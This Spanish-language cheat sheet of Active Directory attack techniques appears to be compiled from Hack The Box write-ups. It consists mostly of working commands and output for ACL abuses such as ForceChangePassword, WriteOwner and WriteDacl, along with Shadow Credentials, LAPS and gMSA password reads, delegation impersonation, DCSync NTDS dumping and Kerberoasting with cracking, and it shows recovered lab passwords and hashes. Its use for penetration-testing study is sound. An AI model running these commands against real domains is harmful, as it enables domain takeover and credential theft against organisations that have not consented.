# BloodHound

### Uso de BloodHound-python
```null
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192 -c All
```

### Inicialización Neo4j
```null
sudo neo4j console
bloodhound &>/dev/null & disown
```

### SharpHound Inyector
```null
PS C:\Temp> .\SharpHound.exe -c All
```

## Abuso de ForceChangePassword

### Modificación de contraseña por RPC
```null
rpcclient -U blackfield/support 10.10.10.192
rpcclient $> setuserinfo audit2020 23 H@CKTHEB0X#
```

## Abuso AddKeyCredentialLink 

### Uso de Invoke-Whisker (Obtención Hash NT)

```null
PS C:\Temp> Invoke-Whisker -Command "add /target:sflowers"
```

```null
.\Rubeus.exe asktgt /user:sflowers /certificate:<CERTIFICATE>
```

## Abuso ReadLAPSPassword

```null
*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Temp> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Temp> $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
*Evil-WinRM* PS C:\Temp> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -PrincipalIdentity 'JDgodd'
*Evil-WinRM* PS C:\Temp> Add-DomainGroupMember -Identity 'Core Staff' -Members 'JDgodd' -Credential $Cred
```

### Extraer credenciales de Administradores locales con LDAP

```null
ldapsearch -H ldap://10.10.11.158 -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: 4)(6&h9+7]QY+o

# search reference
ref: ldap://ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://DomainDnsZones.streamIO.htb/DC=DomainDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://streamIO.htb/CN=Configuration,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

## Abuso WriteOwner

![image](https://rubbxalc.github.io/writeups/assets/img/Object-htb/14.png)

### Crear objeto y modificar las ACLs

```null
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1 
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -Rights ResetPassword -PrincipalIdentity tom
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $SecPassword = ConvertTo-SecureString 'pwned123$!' -AsPlainText -Force             
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity claire -AccountPassword $SecPassword 
```

### Agregar usuario actual a un grupo

```null
*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Temp> Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
*Evil-WinRM* PS C:\Temp> Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights All -PrincipalIdentity maria
*Evil-WinRM* PS C:\Users\maria\Documents> net group "Domain Admins" maria /add /domain
The command completed successfully.
```

## Abuso WriteDacl

### Agregar usuario a un grupo

```null
net group Backup_Admins claire /add
```


## Abuso ReadGMSAPassword

![image](https://rubbxalc.github.io/writeups/assets/img/Intelligence-htb/4.png)

### Desde binario externo

```null
PS C:\Temp> .\GMSAPasswordReader.exe --accountname bir-adfs-gmsa --domainname search.htb
Calculating hashes for Current Value
[*] Input username             : BIR-ADFS-GMSA$
[*] Input domain               : SEARCH.HTB
[*] Salt                       : SEARCH.HTBBIR-ADFS-GMSA$
[*]       rc4_hmac             : E1E9FD9E46D0D747E1595167EEDCEC0F
[*]       aes128_cts_hmac_sha1 : BBCD2446765F390C680CDA31A9FC1783
[*]       aes256_cts_hmac_sha1 : ECAED51920F8677C5846154F69267FE4875543727C7032690016F7947A8A6F94
[*]       des_cbc_md5          : 3843029E088FB983
```

### Con Powershell

```null
PS C:\Temp> $gmsa = Get-ADServiceAccount -Identity 'bir-adfs-gmsa' -Properties 'msDS-ManagedPassword'
PS C:\Temp> $mp = $gmsa.'msDS-ManagedPassword'
PS C:\Temp> $pass = ConvertFrom-ADManagedPasswordBlob $mp
PS C:\Temp> $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
PS C:\Temp> $cred = New-Object System.Management.Automation.PSCredential('search.htb\bir-adfs-gmsa',$SecPass)
PS C:\Temp> Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
search\bir-adfs-gmsa$ 
```

```null
PS C:\Temp> $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
PS C:\Temp> $cred = New-Object System.Management.Automation.PSCredential('search.htb\bir-adfs-gmsa',$SecPass)
PS C:\Temp> Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami }
search\bir-adfs-gmsa$ 
```

### De forma remota

```null
python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -l 10.10.10.248 -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::4eded24079fe2667c67f2b43fd6cb57b
svc_int$:aes256-cts-hmac-sha1-96:3f07249f66a3678529bc87b0d6bce206d86ef0e5ed00f488d66751810c722817
svc_int$:aes128-cts-hmac-sha1-96:b8173f21d39ccd3e047ea12c2f791ab4
```

## Abuso de AllowedToDelegate

Esto significa que tengo la capacidad de impersonar a un usuario

![image](https://rubbxalc.github.io/writeups/assets/img/Intelligence-htb/6.png)

```null
getST.py intelligence.htb/svc_int -hashes :4eded24079fe2667c67f2b43fd6cb57b -impersonate Administrator -spn WWW/dc.intelligence.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

## Abuso de GenericWrite

### Conversión a un usuario en Kerberoasteable

```null
*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-AdUser jorden | Set-ADAccountControl  -doesnotrequirepreauth $true
```

### Modificar Loggon Scripts

```null
*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Temp> echo "dir C:\Users\Maria\Desktop\ > C:\Temp\output.txt" > cmd.ps1
*Evil-WinRM* PS C:\Temp> Set-DomainObject -Identity maria -SET @{serviceprincipalname='C:\Temp\cmd.ps1'}
```

## Abuso ForceChangePassword

### Modificar credenciales a otro usuario

```null
*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Temp> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Temp> Set-DomainUserPassword -Identity smith -AccountPassword $SecPassword
```

## Abuso de DCSync

### Dumpear NTDS

```null
crackmapexec smb 10.10.10.103 -u 'mrlky' -p 'Football#7' --ntds
```

## Abuso de AddKeyCredentialLink

### Añadir Principal para crear unas Shadow Credentials

```null
PS C:\Temp> Invoke-Whisker -Command "add /target:sflowers"
```

Se ejecutará el Rubeus para obtener un hash NTLM y hacer PassTheHash

### Abuso Kerberoasteable

![image](https://rubbxalc.github.io/writeups/assets/img/Sizzle-htb/10.png)

### Con Rubeus

```null
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : HTB.LOCAL
[*] Searching path 'LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : mrlky
[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
[*] ServicePrincipalName   : http/sizzle
[*] PwdLastSet             : 7/10/2018 2:08:09 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$46942998ACECC61F85DF0D44E6DB
                             FBB8$E3F2F615F33DF2F9F06ADD37A8A249B052980073527353B8A7CB98B40C4615FBDC4A3854BAB
                             682BA0607C8D1B239E41D53C2C29317343183AF26A2165F06DFFB7B5CC293B73AED9E34F725E2EC5
                             EDD3852812EF12A6E47386DC3AA20A7685519670D44308E9CA47D27411668E9EDDE7625E1B333DD9
                             3653F974C18FD51BB9D8B76D53C814BB4266E7686B5D4AA10A8B3F0116D335DF1EDCE4EB49CC4FBC
                             B5CB6B79DECD4CF5CC67BB98340B642F1BD7450269F874093F17C60DE0A741F6F112E565FD3A615E
                             3EDFC42E58C8454F7CE6E7C9B6415011A70BB378D5FD2A060B5435F11F0444DA63E963C3DF92EFE3
                             4456C968EB9FDF747A3E262F7472551C2825F3730F860F5396E46C71A2CA980624B5122561EE008C
                             C5B0CCC7D12367EF4FB982B8836DC3B51A395E3B81997E0D7DF3DA5AEC4E873BE0F5C157B8D19B30
                             C2B9DDCE93771BF8A70F3570DCB6CE8FD941AB2DA741B8B92C8210AD7704941CC1E085BFEA54196C
                             47B3D251270FBB42CDC13A11CDEEBE473F00355CEF337E72B6ABD9C8197083EA2E19482FEF6EA9DD
                             80586A8F28C68CEC0822A9112B2DD5342918C8B0F8E638C76BD0FF4357B6E951A544D60D617F606F
                             434698D13B3BC0468B436078ACA89E4592C5B20BE9E63DACD25C0DE3D1C141AE3B93BE6D89E66A3E
                             0C376A3B24814EA53B3FD570EA3E8A43845D4CBAFC8F63D8F2F14B5C280F4E7CE20EBDCA7ECE6DAB
                             D9310B10F5B3ADDD80B31A1746AB91F35776D40DF01A143757E3F459A10EDE11869296C9893FB3D9
                             80B10FA937EAAA33CD1E819CA08007C3C49650E7FCCC20115F6150AB3AEC875FC1B58427C1F7C630
                             F2B1D37CCB9C04EC25CD18236EB07C78DCFA52AC4353DFF7C622576DE19134E7A34FF9ADBC16D209
                             B50CC1D417E2889FAC37B40CA66A5E9CD326020CFB5BCD574A97511359A284E5856D7AA80F135786
                             E57A243C5B7ED853EDF158157FF25F77124EA36F8E6D09FBE316A8FCD569CB0FEBEA67F0EB239C51
                             7DE4F326B7F1E79F666F2D448AE3DB13CAA1B471EF8F4172ABBE3AD78E20F3E86998C5C0B36F3EB3
                             46C4465C886DEDED3BCCC113B0CD4D2B6D331DBCB2D483887CA9195E46DE95DA6368D9F4834BA9D4
                             B25AFF4BDE9FCFF7FE0D4487080CA35487DE4A4AB316492A6534EA7E5BACC67EA6893E1C2C154DBB
                             2CDCB44E43C846A48533EAC21FDC38CF020B72DA506D2D2B2ACF2053DB2F82A699C07B29999E596D
                             EEB3DF46DD18ED0BDDAAC3068DD84887D0248352D24F9F15A76C7AE9015408A18B67649A48B0D056
                             4409DFC2B6695E083AAE400942508E4E6E1082505BBD6082F4185C110B5CBB596A2C426578609E69
                             C02410F432981DD4B
```

#### Crack Hash

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Football#7       (?)     
1g 0:00:00:05 DONE (2023-01-20 14:01) 0.1779g/s 1987Kp/s 1987Kc/s 1987KC/s Forever3!..Flubb3r
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


